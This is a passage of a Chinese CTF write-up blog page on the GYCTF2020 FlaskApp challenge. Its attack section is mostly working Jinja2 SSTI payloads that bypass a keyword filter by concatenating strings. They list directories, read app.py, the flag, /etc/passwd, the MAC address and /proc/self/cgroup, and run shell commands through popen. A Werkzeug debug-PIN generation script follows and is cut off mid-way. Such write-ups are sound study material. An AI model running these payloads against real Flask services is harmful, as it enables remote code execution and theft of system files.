@@ -1,0 +1,826 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF13 | Tcy👦♥QQ👧</title><meta name="keywords" content="ssti,sql bool盲注,pin码ssti利用PIN码进行RCE,shopxo后台全版本获取shell,Smarty SSTI模板注入,PHP mt_rand()随机数安全,反弹shell实验"><meta name="author" content="uploads"><meta name="copyright" content="uploads"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="[GYCTF2020]FlaskApp 给人的感觉就是ssti! 解密的时候输入1！base64只能是在Base64中的可打印字符包括字母A-Z、a-z、数字0-9 Base64索引表：    数值 字符  数值 字符  数值 字符  数值 字符    0 A 16 Q 32 g 48 w      1 B 17 R 33 h 49 x      2 C 18 S 34 i 50 y      3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF13">
+<meta property="og:url" content="https://tanchiyu.top/2021/01/20/BUUCTF-13/index.html">
+<meta property="og:site_name" content="Tcy👦♥QQ👧">
+<meta property="og:description" content="[GYCTF2020]FlaskApp 给人的感觉就是ssti! 解密的时候输入1！base64只能是在Base64中的可打印字符包括字母A-Z、a-z、数字0-9 Base64索引表：    数值 字符  数值 字符  数值 字符  数值 字符    0 A 16 Q 32 g 48 w      1 B 17 R 33 h 49 x      2 C 18 S 34 i 50 y      3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tanchiyu.top/image/ttt.jpg">
+<meta property="article:published_time" content="2021-01-20T00:48:54.000Z">
+<meta property="article:modified_time" content="2021-01-20T15:19:16.227Z">
+<meta property="article:author" content="uploads">
+<meta property="article:tag" content="ssti">
+<meta property="article:tag" content="sql bool盲注">
+<meta property="article:tag" content="pin码ssti利用PIN码进行RCE">
+<meta property="article:tag" content="shopxo后台全版本获取shell">
+<meta property="article:tag" content="Smarty SSTI模板注入">
+<meta property="article:tag" content="PHP mt_rand()随机数安全">
+<meta property="article:tag" content="反弹shell实验">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tanchiyu.top/image/ttt.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="https://tanchiyu.top/2021/01/20/BUUCTF-13/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-20 23:19:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tcy👦♥QQ👧" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tcy👦♥QQ👧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF13</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-20T00:48:54.000Z" title="发表于 2021-01-20 08:48:54">2021-01-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-20T15:19:16.227Z" title="更新于 2021-01-20 23:19:16">2021-01-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231421.png" alt="image-20210120085214408"></p>
+<p>给人的感觉就是ssti!</p>
+<p>解密的时候输入1！base64只能是在Base64中的可打印字符包括<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%89%E4%B8%81%E5%AD%97%E6%AF%8D">字母</a><code>A-Z</code>、<code>a-z</code>、<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%95%B0%E5%AD%97">数字</a><code>0-9</code></p>
+<p>Base64索引表：</p>
+<table>
+<thead>
+<tr>
+<th align="center">数值</th>
+<th align="center">字符</th>
+<th align="center"></th>
+<th align="center">数值</th>
+<th align="center">字符</th>
+<th align="center"></th>
+<th align="center">数值</th>
+<th align="center">字符</th>
+<th></th>
+<th>数值</th>
+<th>字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">A</td>
+<td align="center">16</td>
+<td align="center">Q</td>
+<td align="center">32</td>
+<td align="center">g</td>
+<td align="center">48</td>
+<td align="center">w</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">B</td>
+<td align="center">17</td>
+<td align="center">R</td>
+<td align="center">33</td>
+<td align="center">h</td>
+<td align="center">49</td>
+<td align="center">x</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">C</td>
+<td align="center">18</td>
+<td align="center">S</td>
+<td align="center">34</td>
+<td align="center">i</td>
+<td align="center">50</td>
+<td align="center">y</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">D</td>
+<td align="center">19</td>
+<td align="center">T</td>
+<td align="center">35</td>
+<td align="center">j</td>
+<td align="center">51</td>
+<td align="center">z</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">E</td>
+<td align="center">20</td>
+<td align="center">U</td>
+<td align="center">36</td>
+<td align="center">k</td>
+<td align="center">52</td>
+<td align="center">0</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">F</td>
+<td align="center">21</td>
+<td align="center">V</td>
+<td align="center">37</td>
+<td align="center">l</td>
+<td align="center">53</td>
+<td align="center">1</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">G</td>
+<td align="center">22</td>
+<td align="center">W</td>
+<td align="center">38</td>
+<td align="center">m</td>
+<td align="center">54</td>
+<td align="center">2</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="center">H</td>
+<td align="center">23</td>
+<td align="center">X</td>
+<td align="center">39</td>
+<td align="center">n</td>
+<td align="center">55</td>
+<td align="center">3</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">I</td>
+<td align="center">24</td>
+<td align="center">Y</td>
+<td align="center">40</td>
+<td align="center">o</td>
+<td align="center">56</td>
+<td align="center">4</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">J</td>
+<td align="center">25</td>
+<td align="center">Z</td>
+<td align="center">41</td>
+<td align="center">p</td>
+<td align="center">57</td>
+<td align="center">5</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td align="center">K</td>
+<td align="center">26</td>
+<td align="center">a</td>
+<td align="center">42</td>
+<td align="center">q</td>
+<td align="center">58</td>
+<td align="center">6</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td align="center">L</td>
+<td align="center">27</td>
+<td align="center">b</td>
+<td align="center">43</td>
+<td align="center">r</td>
+<td align="center">59</td>
+<td align="center">7</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td align="center">M</td>
+<td align="center">28</td>
+<td align="center">c</td>
+<td align="center">44</td>
+<td align="center">s</td>
+<td align="center">60</td>
+<td align="center">8</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td align="center">N</td>
+<td align="center">29</td>
+<td align="center">d</td>
+<td align="center">45</td>
+<td align="center">t</td>
+<td align="center">61</td>
+<td align="center">9</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td align="center">O</td>
+<td align="center">30</td>
+<td align="center">e</td>
+<td align="center">46</td>
+<td align="center">u</td>
+<td align="center">62</td>
+<td align="center">+</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td align="center">P</td>
+<td align="center">31</td>
+<td align="center">f</td>
+<td align="center">47</td>
+<td align="center">v</td>
+<td align="center">63</td>
+<td align="center">/</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231422.png" alt="image-20210120085500185"></p>
+<p>我们可以看到ssti漏洞点！</p>
+<p>分析一下他的代码！</p>
+<p>Python format 格式化函数：</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/python/att-string-format.html">https://www.runoob.com/python/att-string-format.html</a></p>
+<p>就是把输入的数据先base64解密！再进行模板渲染！</p>
+<p>输入49不行！</p>
+<p>但是14可以！</p>
+<p>就是waf掉了*</p>
+<h2 id="ctf中flask-ssti的各种绕过技巧"><a href="#ctf中flask-ssti的各种绕过技巧" class="headerlink" title="ctf中flask_ssti的各种绕过技巧:"></a>ctf中flask_ssti的各种绕过技巧:</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9008">https://xz.aliyun.com/t/9008</a></p>
+<p>flask之ssti模版注入从零到入门:</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679">https://xz.aliyun.com/t/3679</a></p>
+<p>着对于我这个python菜鸟来说!还是比较硬伤的！</p>
+<p>这道了是python3后！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231423.png" alt="image-20210120095749019"></p>
+<p>大佬：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/108400293">https://blog.csdn.net/Alexhcf/article/details/108400293</a></p>
+<p>在jinja2中 控制结构 <code>&#123;% %&#125;</code> 变量取值 <code>&#123;&#123; &#125;&#125;</code></p>
+<p>这个对于没学过python的我咋理解呢！就是两种运行的方式把！</p>
+<h2 id="参考Templates-Injections的payload："><a href="#参考Templates-Injections的payload：" class="headerlink" title="参考Templates Injections的payload："></a>参考Templates Injections的payload：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;swisskyrepo&#x2F;PayloadsAllTheThings&#x2F;tree&#x2F;master&#x2F;Server%20Side%20Template%20Injection#twig</span><br></pre></td></tr></table></figure>
+
+<h2 id=""><a href="#" class="headerlink" title=""></a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__bui&#x27;</span><span class="string">&#x27;ltins__&#x27;</span>].open(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="字符串拼接绕过"><a href="#字符串拼接绕过" class="headerlink" title="字符串拼接绕过"></a>字符串拼接绕过</h2><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>看目录：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span>](<span class="string">&#x27;__impor&#x27;</span>+<span class="string">&#x27;t__&#x27;</span>+<span class="string">&#x27;(&quot;o&#x27;</span>+<span class="string">&#x27;s&quot;)&#x27;</span>+<span class="string">&#x27;.pope&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;(&quot;l&quot;+&quot;s /&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>读数据：</p>
+<p>倒叙：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::<span class="number">-1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].popen(&#39;cat &#39;+&#39;&#x2F;this_is_the_fl&#39;+&#39;ag.txt&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里主要是字符串拼接绕过！</p>
+<p>师傅们还有第二种方法：</p>
+<h2 id="利用PIN码进行RCE"><a href="#利用PIN码进行RCE" class="headerlink" title="利用PIN码进行RCE"></a>利用PIN码进行RCE</h2><h3 id="服务器运行flask所登录的用户名"><a href="#服务器运行flask所登录的用户名" class="headerlink" title="服务器运行flask所登录的用户名"></a>服务器运行flask所登录的用户名</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以读取<code>/sys/class/net/eth0/address</code>来获得mac的16进制：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到 02:42:ac:10:a2:a5将其转10进制2485377868453</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210120231424.png" alt="image-20210120104627152"></p>
+<h3 id="机器的id"><a href="#机器的id" class="headerlink" title="机器的id"></a>机器的id</h3><p> linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。</p>
+<p> 对于docker机则读取读取/proc/self/cgroup获取get_machine_id()(docker后面那段字符串)<br>使用如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment">#服务器运行flask所登录的用户名</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment">#modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment">#getattr(app, &quot;\_\_name__&quot;, app.\_\_class__.\_\_name__)</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>,<span class="comment">#flask库下app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377868453&#x27;</span>,<span class="comment">#当前网络的mac地址的十进制数</span></span><br><span class="line">    <span class="string">&#x27;3aded5e5389e2cb989457b0bf88b8c68d710310a4d31879010e2df97d2512eb4&#x27;</span><span class="comment">#机器的id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(bit, str):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % int(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span 